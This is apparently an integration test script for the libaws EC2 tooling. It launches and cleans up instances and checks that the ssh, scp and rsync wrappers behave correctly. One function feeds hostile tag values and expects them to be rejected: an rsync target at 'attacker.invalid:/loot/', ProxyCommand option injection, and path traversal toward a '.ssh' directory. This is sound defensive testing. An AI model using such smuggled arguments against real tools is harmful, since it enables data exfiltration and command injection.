from contextlib import ExitStack
from ipaddress import IPv4Address
import json
import os
from pathlib import Path
import re
import subprocess
import tempfile
import uuid

import yaml

DIRECTORY = Path(__file__).resolve().parent
ROOT = DIRECTORY.parents[2]
LIBAWS = str(ROOT / "libaws")


def run(*args, cwd=DIRECTORY, env=None, stream=False):
    print("$", *args, flush=True)
    try:
        if stream:
            subprocess.run(args, cwd=cwd, env=env, check=True)
            return ""
        return subprocess.check_output(args, cwd=cwd, env=env, text=True).strip()
    except subprocess.CalledProcessError as error:
        if error.output:
            print(error.output, flush=True)
        raise


def cleanup_compute(uid):
    run(
        "go", "test", "./lib", "-run", "^TestEC2ExampleCleanup$", "-count=1", "-v",
        cwd=ROOT, env=dict(os.environ, LIBAWS_EC2_EXAMPLE_UID=uid), stream=True,
    )


def verify_transfer_failure_exits(instance_id, env):
    run(
        "go", "test", "./lib", "-run", "^TestEC2TransferFailureFixture$", "-count=1", "-v",
        cwd=ROOT, env=env, stream=True,
    )
    for command in ("ec2-scp", "ec2-rsync"):
        args = [LIBAWS, command, "local-source", "local-destination", instance_id, "--private-ip"]
        preview = subprocess.run([*args, "--preview"], capture_output=True, text=True, timeout=60)
        assert preview.returncode == 0 and f"targeting: test-ec2-vpc-{env['uid']} {instance_id}" in preview.stderr, preview
        # No user tag: the library returns an error without any per-host result.
        missing_user = subprocess.run(args, capture_output=True, text=True, timeout=60)
        assert missing_user.returncode == 1 and "no user tag available" in missing_user.stderr, missing_user
        assert "failure:" not in missing_user.stderr, missing_user
        # Supplying a user reaches per-host validation. Neither path is remote,
        # so these exit-status assertions never start an SSH connection.
        invalid_paths = subprocess.run([*args, "--user", "fixture"], capture_output=True, text=True, timeout=60)
        assert invalid_paths.returncode == 1 and "neither source nor destination contains ':'" in invalid_paths.stderr, invalid_paths
        assert "failure:" in invalid_paths.stderr and instance_id in invalid_paths.stderr, invalid_paths
        print(f"verified {command}: selected guest, top-level failure=1, per-host failure=1", flush=True)


def set_guest_tags(env, user=None, ssh_id=None):
    # None removes the tag.
    fixture = {k: v for k, v in env.items() if not k.startswith("LIBAWS_EC2_TAG_FIXTURE_")}
    if user is not None:
        fixture["LIBAWS_EC2_TAG_FIXTURE_USER"] = user
    if ssh_id is not None:
        fixture["LIBAWS_EC2_TAG_FIXTURE_SSH_ID"] = ssh_id
    run(
        "go", "test", "./lib", "-run", "^TestEC2TransportTagFixture$", "-count=1", "-v",
        cwd=ROOT, env=fixture, stream=True,
    )


def verify_hostile_tags(instance_id, env):
    with tempfile.TemporaryDirectory(prefix="libaws-ec2-tags-") as temp:
        directory = Path(temp)
        marker = directory / "transport.log"
        # Record every program a transport command could start, including the
        # readiness callback, with NUL-separated arguments.
        for name in ("ssh", "scp", "rsync", "bash", "aws-ec2-ip-callback"):
            stub = directory / name
            stub.write_text('#!/bin/sh\nprintf \'%s\\0\' "$0" "$@" >> "$LIBAWS_EC2_TRANSPORT_LOG"\n')
            stub.chmod(0o700)
        local = str(directory / "local file")
        Path(local).write_text("fixture\n")
        transport_env = dict(
            os.environ, PATH=str(directory), LIBAWS_EC2_TRANSPORT_LOG=str(marker),
            RSYNC_OPTIONS="--exclude=*.tmp --chmod=F600",
        )
        commands = {
            "ec2-rsync-upload": ["ec2-rsync", local, ":/tmp/fixture destination/", instance_id, "--private-ip"],
            "ec2-rsync-download": ["ec2-rsync", ":/tmp/fixture source", local, instance_id, "--private-ip"],
            "ec2-scp": ["ec2-scp", local, ":/tmp/fixture destination", instance_id, "--private-ip"],
            "ec2-ssh": ["ec2-ssh", instance_id, "--cmd", "true", "--private-ip"],
            "ec2-ssh-login": ["ec2-ssh", instance_id],
            # Never allow automatic termination, even if validation regresses.
            "ec2-wait-ssh": ["ec2-wait-ssh", instance_id, "--max-wait", "0", "--private-ip"],
        }

        def transport(args):
            return subprocess.run(
                [LIBAWS, *args], env=transport_env, stdin=subprocess.DEVNULL,
                capture_output=True, text=True, timeout=60,
            )

        def rejected(args, message):
            result = transport(args)
            assert result.returncode == 1 and message in result.stderr and not result.stdout, result
            assert not marker.exists(), marker.read_bytes()

        for user, ssh_id, message in (
            ("x@attacker.invalid:/loot/ --out-format=", None, "invalid ssh user"),  # another rsync host
            ("x /tmp/victim/ y", None, "invalid ssh user"),  # extra local rsync source
            ("-oProxyCommand=false", None, "invalid ssh user"),
            ("fixture", "../../../../home/fixture/.ssh", "invalid ssh-id tag"),
            ("fixture", f"{uuid.uuid4()} -o ProxyCommand=false", "invalid ssh-id tag"),
        ):
            set_guest_tags(env, user, ssh_id)
            for args in commands.values():
                rejected(args, message)
            if ssh_id is None:
                rejected(["ec2-ssh-user", instance_id], message)
            print(f"verified hostile tags user={user!r} ssh-id={ssh_id!r}: no transport started", flush=True)

        # A well-formed ssh-id without a local key falls back to default keys.
        absent = str(uuid.uuid4())
        assert not Path("/tmp/libaws", absent).exists()
        set_guest_tags(env, "fixture", absent)
        for args in commands.values():
            rejected([*args, "--user", "x /tmp/victim/ y"], "invalid ssh user")
        assert run(LIBAWS, "ec2-ssh-user", instance_id) == "fixture"
        host = "fixture@" + run(LIBAWS, "ec2-ip-private", instance_id)
        rsync = [
            str(directory / "rsync"), "-avh", "--delete", "-e", "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no",
            "--exclude=*.tmp", "--chmod=F600", "--",
        ]
        for name, want in (
            ("ec2-rsync-upload", [*rsync, local, f"{host}:/tmp/fixture destination/"]),
            ("ec2-rsync-download", [*rsync, f"{host}:/tmp/fixture source", local]),
            ("ec2-scp", [
                str(directory / "scp"), "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no",
                "--", local, f"{host}:/tmp/fixture destination",
            ]),
        ):
            result = transport(commands[name])
            assert result.returncode == 0, result
            argv = marker.read_bytes().removesuffix(b"\0").decode().split("\0")
            assert argv == want, argv
            marker.unlink()
        print("verified transfer paths with spaces stay single arguments after --", flush=True)


def verify_transport_flags(instance_id):
    with tempfile.TemporaryDirectory(prefix="libaws-ec2-flags-") as temp:
        directory = Path(temp)
        marker = directory / "transport.log"
        # Discovery uses real AWS; transport is recorded locally. The restricted
        # PATH also prevents the optional readiness callback from running.
        for name in ("ssh", "scp", "rsync"):
            stub = directory / name
            stub.write_text('#!/bin/sh\nprintf \'%s\\n\' "$0" "$@" >> "$LIBAWS_EC2_TRANSPORT_LOG"\n')
            stub.chmod(0o700)
        source = directory / "source"
        source.write_text("fixture\n")
        env = dict(os.environ, PATH=str(directory), LIBAWS_EC2_TRANSPORT_LOG=str(marker))
        for command, args, transport in (
            ("ec2-ssh", [instance_id, "--cmd", "true"], "ssh"),
            ("ec2-scp", [str(source), ":/tmp/fixture-destination", instance_id], "scp"),
            ("ec2-rsync", [str(source), ":/tmp/fixture-destination", instance_id], "rsync"),
            # Never allow automatic termination, even if preview regresses.
            ("ec2-wait-ssh", [instance_id, "--max-wait", "0"], "ssh"),
        ):
            base = [LIBAWS, command, *args, "--user", "fixture"]
            for flags in (["--preview"], ["-p"], ["--preview", "--private-ip"], ["-p", "--private-ip"]):
                result = subprocess.run(
                    [*base, *flags], env=env, stdin=subprocess.DEVNULL,
                    capture_output=True, text=True, timeout=60,
                )
                assert result.returncode == 0 and not result.stdout, result
                assert "preview: targeting:" in result.stderr and instance_id in result.stderr, result
                assert not marker.exists(), marker.read_text()
            private = subprocess.run(
                [*base, "--private-ip"], env=env, stdin=subprocess.DEVNULL,
                capture_output=True, text=True, timeout=60,
            )
            assert private.returncode == 0 and "preview:" not in private.stderr, private
            assert private.stdout.strip() == (instance_id if command == "ec2-wait-ssh" else ""), private
            assert marker.is_file(), private
            argv = marker.read_text().splitlines()
            assert argv[0] == str(directory / transport), argv
            targets = [arg.removeprefix("fixture@").split(":")[0] for arg in argv if arg.startswith("fixture@")]
            assert len(targets) == 1 and IPv4Address(targets[0]).is_private, argv
            marker.unlink()
            print(f"verified {command}: -p/--preview never starts transport; --private-ip selects private IPv4", flush=True)


def verify_wait_configuration_failures(instance_id, directory):
    key = str(Path(directory) / "id_ed25519")
    invalid = Path(directory) / "invalid-key"
    invalid.write_text("not a private key")
    missing = str(Path(directory) / "missing-key")
    # Argument/file errors must be checked without AWS access. Fake credentials
    # keep a future validation regression from gaining destructive permissions.
    env = dict(os.environ, AWS_ACCESS_KEY_ID="fixture", AWS_SECRET_ACCESS_KEY="fixture",
               AWS_SESSION_TOKEN="fixture", AWS_EC2_METADATA_DISABLED="true")
    for args, message, code in (
        (["--ed25519", key], "USER is required", 2),
        (["--user", "fixture"], "must be provided", 1),
        (["--user", "fixture", "--ed25519", missing], "read Ed25519 private key", 1),
        (["--user", "fixture", "--rsa", missing], "read RSA private key", 1),
        (["--user", "fixture", "--ed25519", str(invalid)], "parse SSH private key", 1),
        (["--user", "fixture", "--rsa", str(invalid)], "parse SSH private key", 1),
        (["--user", "fixture", "--ed25519", key, "--max-concurrency", "-1"], "must not be negative", 1),
    ):
        result = subprocess.run(
            [LIBAWS, "ec2-wait-gossh", instance_id, "--max-wait", "1", *args],
            capture_output=True, text=True, timeout=15, env=env,
        )
        assert result.returncode == code, result
        if code == 2:  # go-arg writes usage and parser errors to stdout.
            assert result.stdout.startswith("Usage:") and message in result.stdout and not result.stderr, result
        else:
            assert message in result.stderr and not result.stdout, result
        assert "terminating" not in result.stderr, result
    print("verified ec2-wait-gossh configuration and key-file failure exits", flush=True)


def verify_instance_store(uid, key, sg_id):
    with tempfile.TemporaryDirectory(prefix="libaws-nvme-") as directory, ExitStack() as cleanup:
        env = dict(os.environ, LIBAWS_EC2_EXAMPLE_UID=uid, LIBAWS_EC2_NVME_DIR=directory)
        cleanup.callback(
            run, "go", "test", "./lib", "-run", "^TestEC2NVMeExampleCleanup$", "-count=1", "-v",
            cwd=ROOT, env=env, stream=True,
        )
        run(
            "go", "test", "./lib", "-run", "^TestEC2NVMeExamplePrepare$", "-count=1", "-v",
            cwd=ROOT, env=env, stream=True,
        )
        fixture = json.loads((Path(directory) / "fixture.json").read_text())
        instance_id = run(
            "timeout", "--signal=INT", "--kill-after=390s", "300",
            LIBAWS, "ec2-new", f"test-ec2-nvme-{uid}", "--spot", "lowestPrice", "--type", "i4i.large",
            "--ami", "trixie", "--key", key, "--sg", sg_id, "--subnets", fixture["subnet"],
            "--gigs", "8", "--seconds-timeout", "900", "--init", str(Path(directory) / "init.sh"),
        )
        assert re.fullmatch(r"i-[0-9a-f]+", instance_id), instance_id
        run(
            "go", "test", "./lib", "-run", "^TestEC2NVMeExampleIntegration$", "-count=1", "-v",
            cwd=ROOT, env=dict(env, LIBAWS_EC2_NVME_INSTANCE=instance_id), stream=True,
        )


def test():
    assert run(LIBAWS, "aws-account") == os.environ["LIBAWS_TEST_ACCOUNT"]
    os.environ["uid"] = uid = uuid.uuid4().hex[:12]
    vpc = f"vpc-test-{uid}"  # A Name tag beginning with vpc- is not a VPC ID.
    key = f"test-keypair-{uid}"
    infraset = f"test-ec2-subnets-{uid}"
    with tempfile.TemporaryDirectory(prefix="libaws-ec2-key-") as directory:
        run(LIBAWS, "ssh-keygen-ed25519", cwd=directory)
        os.environ["pubkey"] = (Path(directory) / "id_ed25519.pub").read_text().strip()
        with ExitStack() as cleanup:
            # Each root is independent: a failed VPC deletion must not skip the
            # keypair. Fleet discovery works even when ec2-new returned no ID.
            cleanup.callback(run, LIBAWS, "ec2-rm-keypair", key)
            cleanup.callback(run, LIBAWS, "vpc-rm", vpc)
            cleanup.callback(cleanup_compute, uid)
            run(LIBAWS, "infra-ensure", "infra.yaml")
            vpc_id = run(LIBAWS, "vpc-id", vpc)
            sg_id = run(LIBAWS, "ec2-id-sg", vpc, f"test-sg-{uid}")
            zones = set(run(LIBAWS, "ec2-ls-instance-zones", "t3.small").split())
            subnets = [line.split() for line in run(LIBAWS, "vpc-ls-subnets", vpc).splitlines()]
            eligible = sorted(subnet for subnet, zone in subnets if zone in zones)
            assert len(eligible) >= 2, "this regression requires a multi-subnet VPC"

            instance_ids = []
            for mode, lifecycle, selection, expected in (
                ("vpc", "spot", ["--vpc", vpc], eligible),
                # Explicit subnet IDs bypass VPC discovery. The SG ID also needs
                # no name lookup, so the nonexistent --vpc must be ignored.
                ("explicit", "spot", ["--vpc", f"nonexistent-{uid}", "--subnets", eligible[0]], eligible[:1]),
                ("on-demand", "on-demand", ["--vpc", vpc], eligible),
            ):
                instance_name = f"test-ec2-{mode}-{uid}"
                market = ["--spot", "lowestPrice"] if lifecycle == "spot" else []
                instance_id = run(
                    # Give interrupted EC2 library calls their bounded cleanup
                    # window: five minutes for the fleet and one for its launch
                    # template. This adds no delay to successful launches.
                    "timeout", "--signal=INT", "--kill-after=390s", "300",
                    LIBAWS, "ec2-new", instance_name, *market, "--type", "t3.small",
                    "--ami", "trixie", "--key", key, "--sg", sg_id,
                    "--gigs", "8", "--seconds-timeout", "600", *selection,
                )
                assert re.fullmatch(r"i-[0-9a-f]+", instance_id), instance_id
                instance_ids.append(instance_id)
                env = dict(
                    os.environ,
                    LIBAWS_EC2_SUBNET_TEST_INSTANCE=instance_id,
                    LIBAWS_EC2_SUBNET_TEST_NAME=instance_name,
                    LIBAWS_EC2_SUBNET_TEST_VPC=vpc_id,
                    LIBAWS_EC2_SUBNET_TEST_SUBNETS=" ".join(expected),
                    LIBAWS_EC2_SUBNET_TEST_LIFECYCLE=lifecycle,
                )
                run(
                    "go", "test", "./lib", "-run", "^TestEC2SubnetsFromVpcIntegration$",
                    "-count=1", "-v", cwd=ROOT, env=env, stream=True,
                )
                if lifecycle == "spot":
                    # The guest carries EC2's fleet and template tags, verified
                    # above; ec2-ls must hide them, leaving its tags column empty.
                    fields = run(LIBAWS, "ec2-ls", instance_id).split()
                    assert len(fields) == 8 and fields[3] == instance_id and fields[5] == "spot", fields
                if mode == "vpc":
                    verify_transport_flags(instance_id)
                    verify_transfer_failure_exits(instance_id, dict(env, LIBAWS_EC2_EXAMPLE_UID=uid))
                    verify_hostile_tags(instance_id, dict(env, LIBAWS_EC2_EXAMPLE_UID=uid))
            verify_wait_configuration_failures(instance_ids[0], directory)
            run(
                "go", "test", "./lib", "-run", "^TestEC2WaitGoSshScopeIntegration$",
                "-count=1", "-v", cwd=ROOT, stream=True,
                env=dict(os.environ, LIBAWS_EC2_EXAMPLE_UID=uid,
                         LIBAWS_EC2_WAIT_TEST_INSTANCES=" ".join(instance_ids),
                         LIBAWS_EC2_WAIT_TEST_KEY=str(Path(directory) / "id_ed25519")),
            )
            for instance_id in instance_ids:
                run(LIBAWS, "ec2-rm", instance_id, "--wait")
            run(
                "go", "test", "./lib", "-run", "^TestEC2SpotFleetFailureIntegration$",
                "-count=1", "-v", cwd=ROOT, env=dict(os.environ, LIBAWS_EC2_EXAMPLE_UID=uid), stream=True,
            )
            verify_instance_store(uid, key, sg_id)

    inventory = yaml.safe_load(run(LIBAWS, "infra-ls", "--infraset", infraset))
    assert inventory.get("infraset", {}) == {}, inventory
    # Direct absence checks: a lost membership tag is not proof of deletion.
    assert vpc_id not in run(LIBAWS, "vpc-ls")
    assert key not in run(LIBAWS, "ec2-ls-keypairs")
    # Missing resources are safe to finalize again, including preview paths.
    run(LIBAWS, "ec2-rm-keypair", key, "--preview")
    run(LIBAWS, "ec2-rm-keypair", key)


if __name__ == "__main__":
    test()
